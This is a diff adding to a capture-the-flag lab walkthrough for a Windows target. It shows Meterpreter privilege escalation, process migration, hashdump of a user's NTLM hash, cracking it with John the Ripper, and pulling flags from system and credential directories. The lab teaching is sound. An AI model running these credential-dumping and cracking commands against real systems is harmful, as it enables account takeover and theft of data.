@@ -122,6 +122,104 @@ Write: `sessions -i 2`
 
 8. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.
 
+Run `getsystem` it gives "Running as System" which confirms we are running as Administrator (System).
+
+You can check more by writing `shell` to get the Target Windows Shell and then write `whoami` which tells us we are System.
+
+<img width="355" height="179" alt="image" src="https://github.com/user-attachments/assets/f5075c40-a9a3-4121-a78c-703d448c51ad" />
+
+9. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
+
+Run `ps` to get the processes running in the system. The bottom one by NT AUTHORITY\SYSTEM is PID 3008 I guess:
+
+<img width="716" height="157" alt="image" src="https://github.com/user-attachments/assets/bdc7a3f6-b8e5-44f2-ad24-63ecfa6eb122" />
+
+10. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.
+
+Run `migrate 3008`:
+
+<img width="195" height="49" alt="image" src="https://github.com/user-attachments/assets/b63f6ff6-134f-4e4d-98ac-90e30855ee4c" />
+
+## Cracking
+
+### Answer the questions below
+
+1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
+
+Run `hashdump`, we can see non-default useer **Jon**:
+
+<img width="442" height="57" alt="image" src="https://github.com/user-attachments/assets/ff8c204e-2d4b-4843-8478-f177f0b04bb2" />
+
+2. Copy this password hash to a file and research how to crack it. What is the cracked password?
+
+The result we got `Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::`
+
+The fields in this Windows password hash is `username:RID:LM_hash:NTLM_hash`
+
+The NTLM hash is important because it represents the user's actual Windows password. LM (LAN Manager) hash is an old Windows password hashing method that Microsoft used before NTLM.
+
+NTLM (NT LAN Manager) is a Windows authentication protocol that verifies a user's password without storing the actual password.
+
+So we will crack the NTLM hash. Copy the NTLM hash into any file you name. I did `echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt`
+
+Then use John the Ripper to crack the password: `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
+
+We get cracked password: `alqfna22`
+
+<img width="504" height="107" alt="image" src="https://github.com/user-attachments/assets/851720ee-b893-4af1-8a64-1ad0ed371eb0" />
+
+## Find flags!
+
+### Answer the questions below
+
+1. Flag1? This flag can be found at the system root.
+
+We are already as System Root so the most usual drive in Windows is C where all the System information is there so we are going to guess it by: `cat C:\\flag1.txt`
+
+<img width="385" height="118" alt="image" src="https://github.com/user-attachments/assets/57d999cb-db84-453f-9a28-e52b27790346" />
+
+2. Flag2? This flag can be found at the location where passwords are stored within Windows.
+
+*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 
+
+Windows stores local account password hashes in the SAM (Security Account Manager) database. The relevant location is: `C:\Windows\System32\config`
+
+Going to: `cd C:\\Windows\\System32\\config` then `dir` to see the current files in this directory.
+
+We see `flag2.txt` so use `cat flag2.txt`:
+
+<img width="802" height="300" alt="image" src="https://github.com/user-attachments/assets/e3f11b7d-d61c-4ea3-93e6-fdb305105556" />
+
+That's pointing you toward the Administrator's profile directory.
+
+3. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.
+
+That's pointing you toward the Administrator's profile directory. 
+
+I searched the `flag3.txt` by `search -f flag3.txt` and got the location but was able to access it, i guess issue with Meterpreter
+
+<img width="375" height="80" alt="image" src="https://github.com/user-attachments/assets/2a0b6aa9-061b-4e8d-9d92-681fbd181717" />
+
+I downloaded the flag to my local Kali machine then got the flag3: `download C:\\Users\\Jon\\Documents\\flag3.txt`
+
+Then do `cat flag3.txt` to view the flag:
+
+<img width="394" height="48" alt="image" src="https://github.com/user-attachments/assets/75698a08-932c-4473-944f-74738a4f3ed3" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
